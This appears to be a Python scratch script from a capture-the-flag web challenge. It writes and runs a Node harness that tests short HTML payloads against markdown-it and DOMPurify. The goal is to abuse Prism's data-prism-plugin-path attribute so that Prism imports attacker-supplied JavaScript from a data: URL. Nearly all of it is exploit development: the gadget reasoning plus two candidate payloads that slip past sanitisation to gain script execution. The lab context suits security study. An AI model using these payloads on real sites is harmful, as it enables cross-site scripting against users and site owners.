# Let's analyze all ways to get code execution in <= 80 characters

# Recall Prism logic:
# let t = import(this.path + e + ".js")
# this.path = H("plugin-path") ?? "./plugins/"
# if (!this.path.endsWith("/")) this.path += "/";
# e is each item in he("plugins")
# where he("plugins") splits H("plugins") by comma and trims

# Let's test what H("plugin-path") and H("plugins") return from querySelector

# What HTML can we write in body? (len <= 80)
# Body is passed through: DOMPurify.sanitize(md.render(body))

# Let's test various tags and attributes in jsdom:
import subprocess

code = """
const { JSDOM } = require('jsdom');
const MarkdownIt = require('markdown-it');
const DOMPurify = require('dompurify')(new JSDOM('').window);
const md = new MarkdownIt({ html: true, linkify: false });

function testPayload(body) {
    const rendered = DOMPurify.sanitize(md.render(body));
    const dom = new JSDOM(rendered);
    const doc = dom.window.document;
    const p1 = doc.querySelector('[data-prism-plugins]');
    const p2 = doc.querySelector('[data-prism-plugin-path]');
    const pluginsVal = p1 ? p1.getAttribute('data-prism-plugins') : null;
    const pathVal = p2 ? p2.getAttribute('data-prism-plugin-path') : null;
    
    // Simulate Prism:
    if (pluginsVal === null || pathVal === null) return { len: body.length, ok: false, reason: 'missing attr' };
    let path = pathVal.endsWith('/') ? pathVal : pathVal + '/';
    let e = pluginsVal.split(',')[0].trim();
    let importUrl = path + e + '.js';
    return {
        len: body.length,
        ok: true,
        importUrl: importUrl
    };
}

const candidates = [
    '<a data-prism-plugins data-prism-plugin-path=data:text/javascript,import(name)//>',
    '<a data-prism-plugins data-prism-plugin-path="data:text/javascript,import(name)//">',
];

for (const c of candidates) {
    console.log(JSON.stringify(testPayload(c)), c);
}
"""

with open('scripts_dev/test_candidates.js', 'w') as f:
    f.write(code)

import os
app_dir = os.path.abspath('challenge_mouse/app')
p = subprocess.run(['node', os.path.abspath('scripts_dev/test_candidates.js')], cwd=app_dir, capture_output=True, text=True)
print(p.stdout)
